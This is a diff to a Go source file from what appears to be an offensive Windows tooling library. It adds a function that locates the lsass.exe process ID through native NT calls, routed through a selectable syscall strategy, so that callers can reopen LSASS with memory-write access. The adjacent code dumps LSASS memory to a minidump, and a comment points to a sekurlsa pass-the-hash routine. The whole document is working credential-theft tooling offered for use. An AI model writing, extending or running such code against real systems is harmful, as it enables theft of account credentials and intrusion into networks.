@@ -83,6 +83,39 @@ func CloseLSASS(h uintptr) error {
 	return windows.CloseHandle(windows.Handle(h))
 }
 
+// LsassPID walks the running-process list (same path OpenLSASS uses)
+// and returns lsass.exe's PID without leaving an open handle behind.
+// Useful for callers that need to reopen lsass with non-default
+// access (e.g. credentials/sekurlsa.Pass needs PROCESS_VM_WRITE).
+//
+// Caller (optional) routes the NtGetNextProcess / NtQuery* through
+// the wsyscall strategy of the caller's choice.
+func LsassPID(caller *wsyscall.Caller) (uint32, error) {
+	var cur windows.Handle
+	for {
+		next, err := ntGetNextProcess(cur, walkAccess, caller)
+		if cur != 0 {
+			windows.CloseHandle(cur) //nolint:errcheck
+		}
+		if err != nil {
+			if errors.Is(err, errNoMoreEntries) {
+				return 0, ErrLSASSNotFound
+			}
+			return 0, err
+		}
+		name, err := ntProcessImageBaseName(next, caller)
+		if err == nil && strings.EqualFold(name, "lsass.exe") {
+			pid, err := ntProcessPID(next, caller)
+			windows.CloseHandle(next) //nolint:errcheck
+			if err != nil {
+				return 0, fmt.Errorf("read lsass PID: %w", err)
+			}
+			return pid, nil
+		}
+		cur = next
+	}
+}
+
 // Dump reads lsass.exe's memory via NtReadVirtualMemory and writes a
 // MINIDUMP blob (MDMP) to w. The returned Stats summarises what landed.
 // Caller (optional) routes the memory reads through the wsyscall
